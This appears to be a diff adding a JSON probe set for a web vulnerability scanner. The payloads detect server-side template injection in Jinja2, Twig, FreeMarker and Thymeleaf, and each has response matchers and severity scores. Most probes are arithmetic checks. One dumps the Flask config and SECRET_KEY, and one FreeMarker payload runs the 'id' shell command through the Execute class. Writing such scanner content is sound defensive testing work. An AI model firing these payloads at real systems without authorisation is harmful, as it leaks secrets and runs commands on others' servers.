@@ -1,0 +1,130 @@
+{
+  "category": "ssti",
+  "contexts": {
+    "jinja2": {
+      "description": "Server-Side Template Injection probes for Jinja2 (Flask/Django Python stacks)",
+      "tech_match": ["Flask", "Django", "Python"],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "{{7*7}}",
+          "description": "Jinja2 arithmetic evaluation — response containing 49 confirms template execution",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{{config}}",
+          "description": "Jinja2 config dump — reveals SECRET_KEY and DEBUG mode",
+          "matchers": [
+            {"type": "word", "words": ["SECRET_KEY", "DEBUG"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "twig": {
+      "description": "Server-Side Template Injection probes for Twig (PHP/Laravel stacks)",
+      "tech_match": ["PHP", "Laravel"],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "{{7*7}}",
+          "description": "Twig arithmetic evaluation — 49 confirms SSTI",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{{7*'7'}}",
+          "description": "Twig string repetition — 7777777 distinguishes Twig from Jinja2",
+          "matchers": [
+            {"type": "word", "words": ["7777777"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 75,
+          "variables": {}
+        }
+      ]
+    },
+    "freemarker": {
+      "description": "Server-Side Template Injection probes for Apache FreeMarker (Java/Spring/Tomcat stacks)",
+      "tech_match": ["Java", "Spring", "Tomcat"],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "${7*7}",
+          "description": "FreeMarker expression evaluation — 49 confirms SSTI",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+          "description": "FreeMarker RCE probe via Execute class — uid= in response confirms code execution",
+          "matchers": [
+            {"type": "regex", "pattern": "uid=\\d+"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 95,
+          "variables": {}
+        }
+      ]
+    },
+    "thymeleaf": {
+      "description": "Server-Side Template Injection probes for Thymeleaf (Spring/Java stacks)",
+      "tech_match": ["Spring", "Java"],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "__${7*7}__",
+          "description": "Thymeleaf preprocessing expression — 49 confirms SSTI",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "generic": {
+      "description": "Generic SSTI probes for unknown template engine detection",
+      "tech_match": [],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "{{7*7}}",
+          "description": "Mustache/Jinja2/Twig/Handlebars expression probe — 49 confirms evaluation",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "${7*7}",
+          "description": "EL/FreeMarker/Thymeleaf expression probe — 49 confirms evaluation",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
